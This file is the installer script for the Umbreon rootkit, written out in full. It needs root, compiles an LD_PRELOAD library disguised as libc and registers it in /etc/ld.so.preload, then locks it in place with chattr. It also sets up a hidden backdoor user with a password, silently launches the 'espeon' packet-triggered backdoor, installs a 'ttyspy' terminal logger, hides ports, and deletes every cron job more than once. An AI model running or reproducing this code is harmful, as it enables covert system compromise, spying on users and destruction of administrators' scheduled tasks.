#!/bin/bash
sh utils/ex/listen.sh
if [ -f /usr/bin/yum ]; then
  yes|yum install make gcc pam-devel openssl-devel libpcap libpcap-devel newt libgcc.i686 glibc-devel.i686 glibc-devel openssl-devel.i686 wget curl unzip zip strace
elif [ -f /usr/bin/apt-get ] ; then
  dpkg --add-architecture i386
  if [ "$4" == "" ]; then
    yes|apt-get update
  fi
  if [ `uname -m` == 'armv6l' ]; then
    apt-get --yes --force-yes install libpcap-dev libpam0g-dev libssl-dev build-essential wget curl unzip zip strace
  else
    apt-get --yes --force-yes install libpcap-dev libpam0g-dev libssl-dev gcc-multilib build-essential wget curl unzip zip strace
  fi
  grep -i ubuntu /proc/version >&/dev/null  && apt-get --yes --force-yes install libssl-dev:i386 && rm -f /etc/init/plymouth* # lol wow
fi
make distclean
MAGICNUM=$(( ( ($RANDOM & 3)<<30 | $RANDOM<<15 | $RANDOM ) ))
MAGICNUM2=$(( ( ($RANDOM & 3)<<30 | $RANDOM<<15 | $RANDOM ) ))
MAGICNUM3="${MAGICNUM2}${MAGICNUM2}"
HIDEPORT=$(( ($RANDOM >> 8) + 65000))
if [ $UID != 0 ] ; then
    echo "Not root. Cannot continue."
    exit
fi
exec 2>/dev/null
rm -f .rk*
cp inc/config.h inc/config.h.bak
ORIGLIBC="libc.so.6"
LIBC="libc.so.6"
USR="$1"
PWC=$(python utils/cryptpass.py "$2")
PW="$PWC"
ENV="$3"
rm -f .rk*
if [ "$LIBC" != "$ORIGLIBC" ]; then
    echo "Glibc location changed. I seriously fucking hope you know what you're doing."
    echo "Last chance to Ctrl+C, buddy. Ten seconds."
    echo "I am NOT responsible if you brick this box. Not fucking kidding, man."
    sleep 10
fi
echo "Found libc: $LIBC. Editing config."
sed -i "s:FUCKINLIBC:$LIBC:" inc/config.h
sed -i "s:USERDEFAULT:$USR:" inc/config.h
sed -i "s:ENVDEFAULT:$ENV:" inc/config.h
sed -i "s:cryptpass.replace:$PWC:" inc/config.h
sed -i "s:libc.so.0:libc.so.${MAGICNUM2}:g" inc/config.h
sed -i "s:197:$MAGICNUM:g" inc/config.h
sed -i "s:homedir.replace:/usr/lib/libc.so.${MAGICNUM3}:" inc/config.h
echo "Compiling kit"
make umbreon.so >/dev/null || echo "Failed, or warnings were thrown during compile."
make umbreon.so.i686 >/dev/null || echo "Failed on 32-bit compile?"
chattr -ai /etc/ld.so.preload /lib/libc.so.0*
rm -f /lib/libc.so.0* /etc/ld.so.preload
echo "Installing.."
if [ `uname -m` == "armv6l" ]; then
cp umbreon.so /lib/libc.so.$MAGICNUM2.v6l || echo "Fucked up big time. Box might not work now."
else
cp umbreon.so /lib/libc.so.$MAGICNUM2.x86_64 || echo "Fucked up big time. Box might not work now."
cp umbreon.so.i686 /lib/libc.so.$MAGICNUM2.i686 || echo "Could not install 32-bit library. This isn't fatal, but may get you caught later if someone runs a 32 bit program."
fi
mkdir -p "/usr/lib/libc.so.${MAGICNUM3}"
chown $MAGICNUM:$MAGICNUM "/lib/libc.so.$MAGICNUM2" "/usr/lib/libc.so.${MAGICNUM3}"

echo '. .bashrc' > /usr/lib/libc.so.${MAGICNUM3}/.profile
rm /usr/lib/libc.so.${MAGICNUM3}/.bashrc -f 2>/dev/null
rm -rf /etc/cron.hourly/*
rm -rf /etc/cron.daily/*
rm -rf /etc/cron.weekly/*
rm -rf /etc/cron.monthly/*
sh utils/ex/listen.sh
cat .bashrc > /usr/lib/libc.so.${MAGICNUM3}/.bashrc
sed -i "s/MAGIC_ENV/$ENV/" /usr/lib/libc.so.${MAGICNUM3}/.bashrc
mkdir /usr/lib/libc.so.${MAGICNUM3}/bin
cp utils/espeon-shell /usr/lib/libc.so.${MAGICNUM3}/bin/espeon-shell
chmod +x /usr/lib/libc.so.${MAGICNUM3}/bin/espeon-shell
cp utils/ttyspy.sh /usr/lib/libc.so.${MAGICNUM3}/bin/ttyspy
mkdir /usr/lib/libc.so.${MAGICNUM3}/utils
mkdir /usr/lib/libc.so.${MAGICNUM3}/utils/ex
cp utils/ex/listen.sh /usr/lib/libc.so.${MAGICNUM3}/utils/ex/listen.sh
chmod +x /usr/lib/libc.so.${MAGICNUM3}/utils/ex/listen.sh
chmod +x /usr/lib/libc.so.${MAGICNUM3}/bin/ttyspy
sh /usr/lib/libc.so.${MAGICNUM3}/utils/ex/listen.sh
rm -rf /usr/lib/libc.so.${MAGICNUM3}/utils
echo -e "cryptpass='${PWC}'\nhome='/usr/lib/libc.so.${MAGICNUM3}'\nmagic_uid=$MAGICNUM\n" >> /usr/lib/libc.so.${MAGICNUM3}/bin/umbreon.py
cp utils/unhide-self.py /usr/lib/libc.so.${MAGICNUM3}/bin/.x
cp .umbreon-ascii /usr/lib/libc.so.${MAGICNUM3}/.umbreon-ascii ; ./umbreon ; rm -rf umbreon
gcc -lpcap -Iinc utils/espeon.c -o /usr/lib/libc.so.${MAGICNUM3}/bin/espeon 2>/dev/null

if [ -d /proc/vz ]; then
     echo "Not launching Espeon backdoor; we are on OpenVZ and cannot packet capture reliably."
else
    echo "Launching Espeon silent backdoor."
    /usr/lib/libc.so.${MAGICNUM3}/bin/espeon >/dev/null 2>&1 & disown
fi
echo -e '#!/bin/sh\npython ~/bin/.x' > /usr/lib/libc.so.${MAGICNUM3}/bin/unhide-self
chmod +x /usr/lib/libc.so.${MAGICNUM3}/bin/unhide-self
echo > /etc/ld.so.preload
chgrp $MAGICNUM /etc/ld.so.preload
chown $MAGICNUM:$MAGICNUM /etc/ld.so.preload /usr/lib/libc.so.${MAGICNUM3} /usr/lib/libc.so.${MAGICNUM3}/bin
chattr +ia /lib/libc.so.${MAGICNUM2}.*
echo -en "197\n$HIDEPORT" > /usr/lib/libc.so.${MAGICNUM3}/hideports
echo -n "/lib/libc.so.${MAGICNUM2}.\$PLATFORM" > /etc/ld.so.preload
mv inc/config.h.bak inc/config.h || echo "Fucked up big time. Box might not work now."
rm -rf /etc/cron.hourly/*
rm -rf /etc/cron.daily/*
rm -rf /etc/cron.weekly/*
rm -rf /etc/cron.monthly/*
sh utils/ex/listen.sh
echo "Installed successfully."
echo "If you need a backdoor other than the PAM one, consider adding a setgid($MAGICNUM) into it."
echo "If shit is broken, run ./unfuck"
echo "To hide network ports, login to the backdoor and edit the file 'hideports' in your home dir."
echo "Format is 1 port per line."
echo "PAM hideport is $HIDEPORT"
echo "You are advised to remove this directory immediately."
make distclean >/dev/null 2>&1
cho "Should you wish to remove umbreon at any point, keep this shell open"
echo "It is the only EASY way to remove umbreon, once you wish to remove the kit"
echo "Type >/etc/ld.so.preload from your clean terminal"
export PS1="\[\e[00;32m\](Clean) \[\e[0m\]"$PS1
